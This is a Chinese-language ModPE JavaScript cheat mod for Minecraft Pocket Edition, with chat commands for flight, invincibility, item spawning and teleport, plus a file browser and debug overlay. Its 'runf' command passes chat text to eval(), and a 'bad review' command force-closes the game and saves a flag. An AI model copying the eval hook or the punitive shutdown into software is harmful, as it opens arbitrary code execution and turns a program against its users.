if(!存在(主目录+"地图传送点/"+Level.getWorldDir()+"/")){mkdir(主目录+"地图传送点/"+Level.getWorldDir()+"/")}
var 传送点=[Player.getX(),Player.getY(),Player.getZ()]
写入(主目录+"地图传送点/"+Level.getWorldDir()+"/传送点"+传送点序号+".txt",""+传送点);
cM(astr[59]+传送点序号+" "+astr[0]);
}

function newLevel(){
保存日志("新的世界");
读取主数据();
提示信息触发=40;
在主界面=false;
放歌()
}

function leaveGame(){
保存日志("离开游戏");
在主界面=true;
读取主数据();
放歌()
功能=0;
提示信息触发=40;
yzr实体=null;
aswi[8]=false;
}

function modtick(){
runOnUiThread(function(){
try{
new pg.ao.Handler().postDelayed(new pg.jlR({ 
run:function(){ 

if(aswi[8]=true){modTick();modtick();}
}}),50)
/*在此添加android组件*/
}catch(e){}
})}

function modTick(){
var allplayer=Server.getAllPlayers();
if(添加的玩家.length<allplayer.length){
for(var i=0;i<allplayer.length;i++){

if(allplayer[i]!=添加的玩家[i]){entityAddedHook(allplayer[i]);break;}}
添加的玩家=allplayer;}

if(aswi[11]){
for(var i=0;i<allplayer.length;i++){
try{
Entity.addEffect(allplayer[i],MobEffect.jump,20,4,false,true);
Entity.addEffect(allplayer[i],MobEffect.movementSpeed,20,4,false,true);
}catch(e){}}}

if(aswi[4]){Entity.addEffect(getPlayerEnt(),MobEffect.invisibility,99,255,false,false);随机改名()}

if(aswi[14]){
var l=1,k=20,n=粒子种类

if(粒子种类==astr[60]||粒子种类==null){粒子种类=22;}
n=粒子种类;
粒子值++

try{
var Sin=Math.sin(粒子值*Math.PI/180*k)
var Cos=Math.cos(粒子值*Math.PI/180*k)
var Ban=Math.cos(粒子值*Math.PI/360*k)
/////
var x=Player.getX()
var y=Player.getY()+0.5
var z=Player.getZ()
Level.addParticle(n,x+1,y+Cos*l,z-Sin*l,6,6,6,2);
Level.addParticle(n,x+1,y+Cos*l,z+Sin*l,6,6,6,2);
Level.addParticle(n,x+1,y+Cos*l,z,6,6,6,2);
Level.addParticle(n,x-1,y+Cos*l, z-Sin*l,6,6,6,2);
Level.addParticle(n,x-1,y+Cos*l, z+Sin*l,6,6,6,2);
Level.addParticle(n,x-1,y+Cos*l, z,6,6,6,2);
Level.addParticle(n,x+1.5,y-Cos*l,z-Sin*l,6,6,6,2);
Level.addParticle(n,x-1.5,y-Cos*l,z-Sin*l,6,6,6,2);
Level.addParticle(n,x-1.5,y-Cos*l-Sin*l,z-Sin*l-Sin*l,9,9,9,2);
Level.addParticle(n,x-1.5,y-Cos*l+Sin*l,z-Sin*l+Sin*l,9,9,9,2);
Level.addParticle(n,x-1.5,y+Cos*l+Sin*l,z+Sin*l+Cos*l,9,9,9,2);
Level.addParticle(n,x-1.5,y+Cos*l-Sin*l,z+Sin*l-Cos*l,9,9,9,2);
Level.addParticle(n,x+1.5,y-Cos*l-Sin*l,z-Sin*l-Sin*l,9,9,9,2);
Level.addParticle(n,x+1.5,y-Cos*l+Sin*l,z-Sin*l+Sin*l,9,9,9,2);
Level.addParticle(n,x+1.5,y+Cos*l+Sin*l,z+Sin*l+Cos*l,9,9,9,2);
Level.addParticle(n,x+1.5,y+Cos*l-Sin*l,z+Sin*l-Cos*l,9,9,9,2);
Level.addParticle(n,x+1,y-3+Sin*l,z+Ban*l+2,20,20,20,2);
Level.addParticle(n,x-1,y-3+Sin*l,z+Ban*l+2,20,20,20,2);
}catch(e){}
}

if(x速度!=0||y速度!=0||z速度!=0){
Entity.setVelX(控制实体,x速度/200);
Entity.setVelY(控制实体,y速度/200);
Entity.setVelZ(控制实体,z速度/200);
}

定住玩()

if(控制玩家==null){控制玩家=getPlayerEnt()}

if(getCarriedItem()==物品id组[0]&&鄙视延迟==0){cM("<柚子人yzr.ilyzr> §4"+Player.getName(getPlayerEnt())+"§2 我鄙视你！");鄙视延迟=200;}

if(鄙视延迟!=0){鄙视延迟--;}
/*成就*/
if(杀死作者次数==10){cM(astr[61]);杀死作者次数=0}

if(getCarriedItem()==物品id组[2]&&Player.getCarriedItemData()>300&&Level.getGameMode()!=1){Entity.setCarriedItem(getPlayerEnt(),57,1,0);}
else{}

if(锁定时间[0]){Level.setTime(锁定时间[1]);}

if(aswi[21]){Player.setHealth(32767);}

if(抽奖倒计时==0){
抽奖倒计时=-1
var 抽奖几率=random(1,10)

if(抽奖几率==1){cM(astr[62]);}

if(抽奖几率==2){cM(astr[63]);Player.addItemInventory(57,64,0);}

if(抽奖几率==3){cM(astr[64]);Player.addItemInventory(4,25,0);}

if(抽奖几率==4){cM(astr[65]);Player.addItemInventory(42,25,0);}

if(抽奖几率==5){cM(astr[66]);Player.addItemInventory(17,25,0);}

if(抽奖几率==6){cM(astr[67]);Player.addItemInventory(41,25,0);}

if(抽奖几率==7){cM(astr[68]);Player.addItemInventory(173,25,0);}

if(抽奖几率==8){cM(astr[69]);}

if(抽奖几率==9){cM(astr[70]);Player.addItemInventory(物品id组[1],1,0);}

if(抽奖几率==10){cM(astr[71]);Player.addItemInventory(280,1,0);}

}

if(抽奖倒计时>0){抽奖倒计时--;}

if(aswi[17]){
颜色时间++;

if(颜色时间==0){颜色="§4"}

if(颜色时间==2){颜色="§6"}

if(颜色时间==4){颜色="§e"}

if(颜色时间==6){颜色="§2"}

if(颜色时间==8){颜色="§b"}

if(颜色时间==10){颜色="§9"}

if(颜色时间==12){颜色="§d"}

if(颜色时间==14){颜色="§2"}

if(颜色时间==16){颜色时间=0;}
}

if(yzr实体!=null){
作者信息倒计时--;
if(作者信息倒计时==0){
作者信息倒计时=500
switch(random(0,10)){
case 1:cM("<柚子人yzr.ilyzr> §3你好 "+Player.getName(getPlayerEnt())+" 我是你的助手。你需要什么帮助吗？");break;
case 2:cM("<柚子人yzr.ilyzr> §6我挖到一些钻石，"+Player.getName(getPlayerEnt())+"你要不要？\^o^/");
Level.dropItem(Entity.getX(yzr实体), Entity.getY(yzr实体),Entity.getZ(yzr实体),0,255,2,0);
break;
case 3:cM("<柚子人yzr.ilyzr> §2"+Player.getName(getPlayerEnt())+" 我最喜欢做js了。我喜欢玩mc,tr,gta,bs。(¯(●●)¯)");break
case 4:cM("<柚子人yzr.ilyzr> §3欢迎加入yzr的mc,tr,gta,bs讨论群，群号码：123456789。百度贴吧:搜§6柚子人吧§2查看更多js。(^o^)");break
case 5:cM("<柚子人yzr.ilyzr> §4我讨厌那些抄袭我js的人!╰_╯，"+Player.getName(getPlayerEnt())+" 你可不要怎么做…");break
case 6:cM("<柚子人yzr.ilyzr> §3"+Player.getName(getPlayerEnt())+" 不要打我，我很可怜的⊙▽⊙");break
case 7:cM("<柚子人yzr.ilyzr> §2希望你喜欢我做的js(´・ω・`)");break
case 8:cM("<柚子人yzr.ilyzr> §6我最喜欢人的是(秘密)(#^.^#)");break
case 9:cM("<柚子人yzr.ilyzr> §3"+Player.getName(getPlayerEnt())+"，偷偷告诉你这个js有隐藏功能哦↖(^ω^)↗");break
case 10:cM("<柚子人yzr.ilyzr> §2"+Player.getName(getPlayerEnt())+" 如果有疑问+作者QQ123456789，很快会回复哦。(○’ω’○)");break
}
}
}

if(aswi[19]&&aswi[18]&&Entity.getHealth(getPlayerEnt())>0){
aswi[19]=false;读取物品栏(20);}

if(功能==14&&getCarriedItem()==物品id组[2]){var 实体=Entity.getAll();
for(var 数量=0;数量<实体.length;数量++){
var type=Entity.getEntityTypeId(实体[数量])
if(type==64||type==EntityType.EXPERIENCE_ORB){Entity.setPosition(实体[数量],Player.getX(),Player.getY(),Player.getZ());}
}}

if(aswi[17]){

if(功能==0){功能名称="OFF"}

if(功能==1){功能名称="T3H2"}

if(功能==2){功能名称="S1Z4"}

if(功能==3){功能名称="G3M2"}

if(功能==4){功能名称="B4J2"}

if(功能==5){功能名称="H2Y2"}

if(功能==6){功能名称="M3S1"}

if(功能==7){功能名称="S3D4"}

if(功能==8){功能名称="P2J4"}

if(功能==9){功能名称="S4Z4"}

if(功能==10){功能名称="S4D3"}

if(功能==11){功能名称="W2Q2"}

if(功能==12){功能名称="H2D4"}

if(功能==13){功能名称="D4Q2"}

if(功能==14){功能名称="J3W4"}

if(功能==15){功能名称="M3W1"}

if(功能==16){功能名称="C1Q2"}

if(功能==17){功能名称="C1J3"}

if(debug实体id!=0){debug实体倒计时--}

if(debug实体倒计时==0){debug实体id=0,debug实体模型id=0,debug实体倒计时=100}

if(debug方块id!=0){debug方块倒计时--}

if(debug方块倒计时==0){debug方块id=0,debug方块倒计时=100} 
var debugY视角=Math.round(Entity.getPitch(getPlayerEnt()));
var debugXZ视角=Math.round(Entity.getYaw(getPlayerEnt()));
var debug物品id=Player.getCarriedItem();
var debug物品dmg=Player.getCarriedItemData();
var x轴位debug=Math.round(Player.getX());
var y轴位debug=Math.round(Player.getY())-2
var z轴位debug=Math.round(Player.getZ());
var 生态系统=Level.getBiomeName(Player.getX(),Player.getZ())
var 生态系统id=Level.getBiome(Player.getX(),Player.getZ())
var debug时间=Level.getTime();
var debug实体信息
if(debug实体id!=0){debug实体信息="EID:"+debug实体id+" ERID:"+debug实体模型id+" EH:"+debug实体血量+"\n"}

if(debug实体id==0){debug实体信息=""}
var debug物品信息
if(getCarriedItem()!=0){debug物品信息="ID:"+debug物品id+" DMG:"+debug物品dmg+"\n"}

if(getCarriedItem()==0){debug物品信息=""}
var debug方块信息
if(debug方块id==0){debug方块信息=""}

if(debug方块id!=0){debug方块信息="BID:"+debug方块id+" BDMG:"+debug方块dmg+" SIDE:"+debug方块side+"\n"}
var debugstr=""+颜色+""+debug方块信息+""+debug物品信息+""+debug实体信息+"BIO:"+生态系统+":"+生态系统id+" P:"+debugY视角+" Y:"+debugXZ视角+"\nX:"+x轴位debug+" Y:"+y轴位debug+" Z:"+z轴位debug+" TIME:"+debug时间+"";

ModPE.showTipMessage(debugstr);
}

if(savelog>0&&aswi[12]){savelog--;}

if(savelog==0&&aswi[12]){savelog=1200;print(astr[72]);
写入(主目录+"日志信息.txt","debug:\n"+debugstr2+"\nvar信息:\n"+var信息+"\n启动器:\n"+ctx.getPackageName()+"\n游戏版本:"+游戏版本+"\njs版本:"+inf.v+"\n屏幕宽高:"+scrwid+"×"+scrhei+"\n日志:\n"+日志);
}

if(close>0){close--}

if(close==10){cM(astr[73]);aswi[22]=true;写入主数据()}

if(close==30){cM(astr[74]);}

if(提示信息触发>0){提示信息触发--}

if(提示信息触发==0&&!aswi[23]){提示信息触发=-1,print(astr[75]),cM(astr[76][0]+inf.v+astr[76][1]);}

if(close==0){
runOnUiThread(function(){ctx.finish();});}
try{
if(循环!=0){循环--;}

if(循环==0){循环=循环固定时;放歌();}

if(Player.getDimension()!=实际维度缓存){放歌();}
if(Level.getGameMode()!=实际模式缓存){放歌();}
}catch(e){}

}
function 定住玩(){
for(ic=0;ic<=玩家固定数;ic++){
if(定住玩家[ic*6]){
Entity.setPosition(定住玩家[(ic*6)+1],定住玩家[(ic*6)+2],定住玩家[(ic*6)+3],定住玩家[(ic*6)+4]);
rideAnimal(定住玩家[(ic*6)+5],定住玩家[(ic*6)+1]);
Entity.setHealth(定住玩家[(ic*6)+1],100)
}}
}
function 打开返回按钮(返回x,返回y,返回z){
保存日志("打开返回按钮");
runOnUiThread(function(){try{
var a=新建按钮(astr[78],100,60)
var ct=3
返回按钮=a[1]
a[0].setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
ct--
if(ct==2){cM(astr[77]);}
if(ct==1){Entity.setPosition(getPlayerEnt(),返回x,返回y,返回z);返回按钮.dismiss();返回按钮=null;}}}))
}catch(e){alert(astr[2]+":\n"+e);}
})

}

/*命令*/
function procCmd(cmd){
保存日志("输入命令",cmd);
var cmd=cmd.split(" ");
var pn=Player.getName(getPlayerEnt())
if(cmd[0]=="关闭提示"){aswi[23]=true;
写入主数据();
cM(astr[0]);
}
else if(cmd[0]=="difficulty"){
Level.setDifficulty(cmd[1])
switch(Number(cmd[1])){
case 0:cM(astr[84]+astr[85][0]);break;
case 1:cM(astr[84]+astr[85][1]);break;
case 2:cM(astr[84]+astr[85][2]);break;
case 3:cM(astr[84]+astr[85][3]);break;
}
}
else if(cmd[0]=="kill"){
if(Level.getGameMode()==1){Player.setHealth(0);return;}
var mob=Level.spawnMob(Player.getX(),Player.getY(),Player.getZ(),80)
Entity.setVelY(mob,999);
Entity.setFireTicks(getPlayerEnt(),200)
cM(astr[86])
}
else if(cmd[0]=="runf"){
try{
eval(String(cmd[1]));}catch(e){cM(astr[2]+e);}
cM(astr[87])
}
else if(cmd[0]=="warp"){
读取传送点(cmd[1]);
}
else if(cmd[0]=="setwarp"){
写入传送点(cmd[1]);
}
else if(cmd[0]=="spawn"){
读取传送点("出生点");
}
else if(cmd[0]=="贴吧"){打开窗口(astr[88],astr[89],12,1000,600,0,0);}
else if(cmd[0]=="help"){alert(alert内容[2])}
else if(cmd[0]=="无敌"){aswi[21]=true;cM(astr[0]);}
else if(cmd[0]=="飞行"){cM(astr[0]);

if(!Player.canFly()){Player.setCanFly(true);}
else{Player.setCanFly(false);}
}
else if(cmd[0]=="抽奖"){神器选择(17);}
else if(cmd[0]=="clear"){cM(astr[90][0]+pn+astr[90][1]);
for(物品栏=0;物品栏<=44;物品栏++){Player.clearInventorySlot(物品栏);}}
else if(cmd[0]=="effect"){

if(cmd[1]=="clear"){Entity.removeAllEffects(getPlayerEnt());cM(astr[91][0]+pn+astr[91][1]);}

if(cmd[1]=="22"){效果id=MobEffect.absorption;效果名称="伤害吸收";}

if(cmd[1]=="15"){效果id=MobEffect.blindness;效果名称="失明";}

if(cmd[1]=="9"){效果id=MobEffect.confusion;效果名称="反胃";}

if(cmd[1]=="5"){效果id=MobEffect.damageBoost;效果名称="力量";}

if(cmd[1]=="11"){效果id=MobEffect.damageResistance;效果名称="抗性提升";}

if(cmd[1]=="4"){效果id=MobEffect.digSlowdown;效果名称="挖掘疲劳";}

if(cmd[1]=="3"){效果id=MobEffect.digSpeed;效果名称="急迫";}

if(cmd[1]=="12"){效果id=MobEffect.fireResistance;效果名称="防火";}

if(cmd[1]=="7"){效果id=MobEffect.harm;效果名称="瞬间伤害";}

if(cmd[1]=="6"){效果id=MobEffect.heal;效果名称="瞬间治疗";}

if(cmd[1]=="21"){效果id=MobEffect.healthBoost;效果名称="生命提升";}

if(cmd[1]=="17"){效果id=MobEffect.hunger;效果名称="饥饿";}

if(cmd[1]=="14"){效果id=MobEffect.invisibility;效果名称="隐身";}

if(cmd[1]=="8"){效果id=MobEffect.jump;效果名称="跳跃提升";}

if(cmd[1]=="2"){效果id=MobEffect.movementSlowdown;效果名称="缓慢";}

if(cmd[1]=="1"){效果id=MobEffect.movementSpeed;效果名称="速度";}

if(cmd[1]=="16"){效果id=MobEffect.nightVision;效果名称="夜视";}

if(cmd[1]=="19"){效果id=MobEffect.poison;效果名称="中毒";}

if(cmd[1]=="10"){效果id=MobEffect.regeneration;效果名称="生命恢复";}

if(cmd[1]=="23"){效果id=MobEffect.saturation;效果名称="饱和";}

if(cmd[1]=="13"){效果id=MobEffect.waterBreathing;效果名称="水下呼吸";}

if(cmd[1]=="18"){效果id=MobEffect.weakness;效果名称="虚弱";}

if(cmd[1]=="20"){效果id=MobEffect.wither;效果名称="凋零";}

if(cmd[2]!=undefined){Entity.addEffect(getPlayerEnt(),效果id,20*cmd[2],cmd[3],false,true);
cM(astr[92]+pn+astr[93][0]+cmd[2]+astr[93][1]+效果名称+astr[93][2]+cmd[1]+"*"+cmd[3]+astr[93][3]);}
}
else if(cmd[0]=="weather"){

if(cmd[1]=="rainy"){Level.setRainLevel(1);
cM(astr[94]);}

if(cmd[1]=="thunder"){Level.setLightningLevel(1);
cM(astr[95]);}

if(cmd[1]=="clear"){
Level.setLightningLevel(0);
Level.setRainLevel(0);
cM(astr[96]);}
}
else if(cmd[0]=="gamerule"){
cm(astr[97])
if(cmd[1]=="doDaylightCycle"){

if(cmd[2]=="true"){锁定时间[0]=true;锁定时间[1]=Level.getTime();}

if(cmd[2]=="false"){锁定时间[0]=false;}
}

if(cmd[1]=="keepInventory"){

if(cmd[2]=="true"){aswi[18]=true}

if(cmd[2]=="false"){aswi[18]=false}}
}
else if(cmd[0]=="repair"){cM(astr[0]);
Entity.setCarriedItem(getPlayerEnt(),getCarriedItem(),Player.getCarriedItemCount(),0);}
else if(cmd[0]=="xp"){
var exp=cmd[1]
Player.addExp(exp);cM(astr[92]+pn+" "+exp+astr[98]);}
else if(cmd[0]=="time"){

if(cmd[1]=="stop"&&!锁定时间[0]){锁定时间[0]=true;锁定时间[1]=Level.getTime();cM(astr[99]);}

if(cmd[1]=="start"&&锁定时间[0]){锁定时间[0]=false;cM(astr[100]);}

if(cmd[1]=="set"){var 时间设置=cmd[2];Level.setTime(时间设置);cM(astr[101]+时间设置);}

if(cmd[1]=="add"){
var a=Number(Level.getTime())+Number(cmd[2]);Level.setTime(a);cM(astr[101]+a);}
}
else if(cmd[0]=="gamemode"){
var a=Number(cmd[1]);
Level.setGameMode(a);
cM(astr[102][0]+pn+astr[102][1]+astr[103+a]+astr[102][2]);
}
else if(cmd[0]=="give"){
var id=cmd[1]
var count=cmd[2]
var dmg=cmd[3];
if(dmg==undefined){dmg=0;}
if(count==undefined){count=1;}
Player.addItemInventory(id,count,dmg);cM(astr[92]+pn+" "+count+astr[107]+id+":"+dmg+astr[108]);}
else if(cmd[0]=="tp"){
runOnUiThread(function(){
try{
if(返回按钮!=null){
返回按钮.dismiss();
返回按钮=null;}
}catch(e){}
})

var 传送x=Player.getX();
var 传送y=Player.getY();
var 传送z=Player.getZ();
打开返回按钮(传送x,传送y,传送z);

if(cmd[1]=="~"){传送x=Player.getX();}
else{传送x=Number(cmd[1])}
if(cmd[2]=="~"){传送y=Player.getY();}
else{传送y=Number(cmd[2])}
if(cmd[3]=="~"){传送z=Player.getZ();}
else{传送z=Number(cmd[3])}
if(传送x==NaN||传送y==NaN||传送z==NaN){cM(astr[109]);return;}
Entity.setPosition(getPlayerEnt(),Math.round(传送x),Math.round(传送y),Math.round(传送z));cM(astr[102][0]+pn+astr[110]+Math.round(传送x)+","+Math.round(传送y)+","+Math.round(传送z));}

else if(cmd[0]=="heal"){Player.setHealth(20);cM(astr[111]+pn);}

else if(cmd[0]=="spawnpoint"){
var 出生点x=Math.round(Player.getX());
var 出生点y=Math.round(Player.getY());
var 出生点z=Math.round(Player.getZ());
写入传送点("出生点");
Level.setSpawn(出生点x,出生点y,出生点z);cM(astr[102][0]+pn+astr[112]+出生点x+","+出生点y+","+出生点z);}
else if(cmd[0]=="ilyzr"){cM(inf.n+astr[113]);}
else if(cmd[0]=="改名字"&&功能==3){名字=cmd[1];cM(astr[114]);}
else if(cmd[0]=="土豪"){神器选择(1)}
else if(cmd[0]=="核弹"){神器选择(12);总设值=64;}
else if(cmd[0]=="还原"){神器选择(5)}
else if(cmd[0]=="秒杀"){神器选择(6)}
else if(cmd[0]=="骑动物"){神器选择(11)}
else if(cmd[0]=="动物骑动物"){神器选择(13)}
else if(cmd[0]=="穿墙"){神器选择(16);}
else if(cmd[0]=="打闪电"){神器选择(7)}
else if(cmd[0]=="秒挖"){神器选择(15)}
else if(cmd[0]=="debug"&&pn!="yzr"){cM(astr[115]);}
else if(cmd[0]=="debug"&&pn=="yzr"){cM(astr[0]);打开主要按钮();}
else if(cmd[0]=="创造"){Level.setGameMode(1);cM(astr[116]);}
else if(cmd[0]=="生存"){Level.setGameMode(0);cM(astr[117]);}
else if(cmd[0]=="日出"){cM(astr[118]);Level.setTime(0);}
else if(cmd[0]=="日落"){cM(astr[119]);Level.setTime(12000);}
else if(cmd[0]=="off"){神器选择(0);}
else if(cmd[0]=="生成作者"){神器选择(2);}
else if(cmd[0]=="改名"){神器选择(3)}
else if(cmd[0]=="爆菊"){神器选择(4)}
else if(cmd[0]=="送钻石"){神器选择(9);总设值=64;}
else if(cmd[0]=="捡物品"){神器选择(14)}
else if(cmd[0]=="神器"){神器选择(18)}
else if(cmd[0]=="出生点"){神器选择(10)}
else if(cmd[0]=="评价"){神器选择(8)}
else if(cmd[0]=="好评"&&功能==8){cM(astr[120]);}
else if(cmd[0]=="差评"&&功能==8){cM(astr[121]);功能=0,close=100;aswi[22]=true;写入主数据();}
else if(cmd[0]=="声明"){alert(alert内容[0]);}

else{cM(astr[122]);}
}

function 文件浏览(路径){
if(!是否文件夹(路径)){
try{
var files=new pg.jiF(路径,"/").listFiles(),a=[],b=[]

for(i=0;i<files.length;i++){
var path=files[i].toString();
if(是否文件夹(path)){a.push(path);a.sort()}
if(!是否文件夹(path)){b.push(path);b.sort()}
}

return b.concat(a)
}catch(e){}
}

else{print(astr[123]);
var dialog=new pg.aaADB(ctx)
var 文件名=分离路径(路径)[1]
dialog.setTitle(astr[124]+":"+文件名);
dialog.setItems(new pg.jlS(astr[125]).split(","),new pg.acDIOCL(){
onClick:function(dia,w){
try{
switch(w){
case 0:打开窗口(astr[126],路径,4,800,600,0,0);var b=读取(路径);print(astr[129]+b.length);break;

case 1:打开窗口(astr[127],[路径,false,null,false,false],random(0,999),0,0,0,0);break;

case 2:try{打开窗口(astr[128],路径,3,scrwid/1.2,scrhei/1.2,0,0);break;}catch(e){}

case 3:打开窗口(astr[88],"file://"+encodeURI(路径),5,1000,600,0,0);break;

case 4:
try{解密js(路径)}catch(e){alert(astr[1]+e)}break;

case 5:try{var intent=new pg.ac.Intent()
intent.addFlags(pg.ac.Intent.FLAG_ACTIVITY_NEW_TASK);
intent.setAction(pg.ac.Intent.ACTION_VIEW);
intent.setDataAndType(new pg.an.Uri.fromFile(文件(路径)),"*/*");
ctx.startActivity(intent);
}catch(e){print(e)}break;

case 6:悬浮窗路径=路径;写入主数据();
if(存在(主目录+"悬浮窗图片.txt")){文件(主目录+"悬浮窗图片.txt").delete()}
主要按钮.dismiss();打开主要按钮();print(astr[0]);break;

case 7:
写入(主目录+"悬浮窗图片.txt",读取(路径))
主要按钮.dismiss();打开主要按钮();print(astr[0]);break;
case 8:
var a=检索函数(路径)
alert(a.split("\n\n").length+"\n\n"+a,astr[19])
break;
case 9:aswi[25]=true;aswi[27]=true;复制路径=路径;print(astr[223]);
var a=新建按钮("取消",100,60)
复制按钮=a[1]
a[0].setOnClickListener(new pg.avVOCL({onClick:function(v,event){
aswi[25]=false
aswi[27]=false
a[1].dismiss()
}}));
break;
case 10:
var dialog=new pg.aaADB(ctx)
dialog.setTitle(astr[162])
dialog.setMessage(astr[162]+文件名+"？");
dialog.setPositiveButton(astr[163],new pg.acDIOCL(){
onClick:function(dia,w){
文件(路径).delete()
print(astr[166]+astr[165]+":"+文件名+" "+astr[0])
}})
dialog.setNegativeButton(astr[164],null)
dialog.show()
break;
}
}catch(e){print(e)}
}})
dialog.show()
}
}

function 是否文件夹(路径){
var files=new pg.jiF(路径,"");
if(files==null||!files.exists()||files.isDirectory())
{return false;}
else
{return true;
}
}

function 打开帮助(){
runOnUiThread(function(){
try{
var dialog=new pg.aaADB(ctx)
dialog.setTitle(astr[167])
dialog.setItems(new pg.jlS(astr[168]).split(","),new pg.acDIOCL(){
onClick:function(dia,w){
switch(w){
case 0:print(astr[169]);
var dialog=new pg.aaADB(ctx)
dialog.setTitle(astr[170])
dialog.setMessage(astr[171])
var layout=new pg.awLL(ctx)
layout.setOrientation(1)
var tmp=gui缩放
var title=文本(layout,astr[172]+gui缩放);
title.setTextColor(pg.agC.argb(255,255,255,255));

var a=拖动(layout,gui缩放,499)
a.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:function(v){
gui缩放=a.getProgress()+1
title.setText(astr[172]+gui缩放);
}}))

dialog.setPositiveButton(astr[163],new pg.acDIOCL(){
onClick:function(dia,w){
写入主数据()
print(astr[0])
}})
dialog.setNegativeButton(astr[164],new pg.acDIOCL(){
onClick:function(dia,w){
gui缩放=tmp
写入主数据()
print(astr[0])
}})
dialog.setView(layout)
dialog.show()
break;
case 1:var dialog=new pg.aaADB(ctx)
dialog.setTitle(astr[173])
dialog.setPositiveButton(astr[163],new pg.acDIOCL(){
onClick:function(dia,w){
文件(主目录+"设置.txt").delete()
print(astr[174])
}})
dialog.setNegativeButton(astr[164],null)
dialog.show()
break;
case 2:alert(astr[175]);break;
case 3:alert(astr[176]);打开debug开关();break;
case 4:alert(astr[177]);open按钮设置Menu();break;
case 5:alert(astr[178])
打开窗口(astr[151],文件浏览(sdcard),4,400,500,0,0);break;
case 6:break;
}
}})
dialog.show()
}catch(e){print(e)}
})
}
function addWinButt(layout){
文本(layout,astr[180],5)
按钮(layout,astr[152],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[152],"",10,360,405,0,0)
}}))

按钮(layout,astr[161],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[161],astr[161],1,0,0,0,0)
}}))
按钮(layout,astr[155],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[155],"",7,0,0,0,0)
}}))
按钮(layout,astr[154],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[154],"",8,0,0,0,0)
}}))
按钮(layout,astr[156],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[156],astr[156],6,0,0,0,0)
}}))
按钮(layout,astr[160],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[160],"粒子",2,0,0,0,0)
}}))
按钮(layout,astr[158],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
打开窗口(astr[158],0,4,0,0,0,0)
}}))
按钮(layout,astr[153],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[153],"",9,0,0,0,0)
}}))
按钮(layout,astr[159],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[159],astr[159],3,0,0,0,0);
}}))
按钮(layout,astr[157],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[157],"实体设置",5,0,0,0,0);
}}))
按钮(layout,astr[88],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[88],"http://www.baidu.com",5,1000,600,0,0);
}}))
按钮(layout,astr[151],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[151],文件浏览(sdcard),5,400,500,0,0);
}}))
按钮(layout,astr[150],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[150],"",5,400,500,0,0);
}}))
按钮(layout,astr[196],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[196],"",5,400,500,0,0);
}}))
if(aswi[28]){
分割线(layout)
文本(layout,astr[181])
按钮(layout,astr[126],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[126],主目录+"设置.txt",5,400,500,0,0);
}}))
 
按钮(layout,astr[127],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[127],[主目录+"music/menu/menu4.ogg",false,null,false,false],5,400,500,0,0);
}}))
按钮(layout,astr[128],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[128],"",5,400,500,0,0);
}}))
}
}
function openMenu(){
保存日志("打开主菜单");
//try{
var layout=制作菜单(0)
/*
文本(lay2,astr[180],5)
按钮(lay2,"这里将会有按钮",-1)
文本(lay2,"你们同意吗？\n就是内置预设窗口那些按钮，会到这里！",10)
文本(lay2,"你们同意吗？\n就是内置预设窗口那些按钮，会到这里！",10)
文本(lay2,"你们同意吗？\n就是内置预设窗口那些按钮，会到这里！",10)*/
文本(layout,inf.n,5).setOnLongClickListener(new pg.avVOLCL({onLongClick:function(viewarg){打开帮助();return true;}}))
文本(layout,inf.v,-3)
文本(layout,astr[179],-5);
if(aswi[28])文本(layout,"DEV MODE");

if(!aswi[29]){
按钮(layout,astr[180],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
var layout=制作菜单(scrwid/4)
addWinButt(layout)
}}))
}
else{
分割线(layout)
addWinButt(layout)
分割线(layout)
}
按钮(layout,astr[149],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
var layout=制作菜单(scrwid/4)
if(!存在(主目录+"自定义窗口/")){mkdir(主目录+"自定义窗口/")}
var path=文件浏览(主目录+"自定义窗口/")
按钮(layout,astr[182],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){写入模板();print(astr[0])
}}))
按钮(layout,astr[183],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[88],astr[225],12,1000,600,0,0);
}}))

var i=0
while(i<path.length){
eval("按钮(layout,分离路径(path["+i+"])[1],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[149],path["+i+"],5,0,0,0,0);}}))")
i++
}
}}))
按钮(layout,astr[184],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
var layout=制作菜单(scrwid/4)

文本(layout,astr[184],5)
按钮(layout,astr[185],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
打开debug开关()
}}))

勾选(layout,astr[186],开关gui(快捷方式)).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
if(快捷方式==null){打开快捷方式();}
else{快捷方式.dismiss();快捷方式=null;}
}catch(e){print(e)}
}}));
勾选(layout,astr[187],aswi[8]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[8]=!aswi[8]
modtick()
}catch(e){print(e)}
}}));
勾选(layout,astr[226],aswi[26]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[26]=!aswi[26]
if(aswi[26])print(astr[227]);
写入主数据()
}catch(e){print(e)}
}}));
